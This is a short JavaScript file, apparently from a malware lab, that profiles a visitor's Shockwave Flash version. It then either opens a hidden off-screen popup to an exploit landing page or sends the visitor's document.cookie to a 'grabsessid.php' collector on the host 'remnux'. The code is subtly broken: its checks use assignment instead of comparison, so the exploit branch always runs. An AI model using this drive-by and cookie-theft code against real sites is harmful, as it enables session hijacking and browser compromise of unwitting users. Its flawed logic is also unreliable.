// Checks if Shockwave is version 28
function profileShockwave() {
	if (navigator.plugins.named = "Shockwave Flash") {		
		var v = (navigator.plugins['Shockwave Flash'].description).split(' ')[2];
		if (v = '28.0') {
			driveBy();
		} else {
			sessionHijack();
		}			
	}
}

// If 28, sends to Shockwave 28 exploit page
function driveBy() {
	var url = "//remnux/landing_page.html";
	var x = window.open(url, 's', 'width=5, height=2, left='+screen.width+', top='+screen.height+', resizable=yes, toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=yes, resizable=no, copyhistory=no');
	x.blur();
	window.focus();
}

// If not 28, sends session ID to collector
function sessionHijack() {
	(new Image()).src = "//remnux/grabsessid.php?" + document.cookie;
}

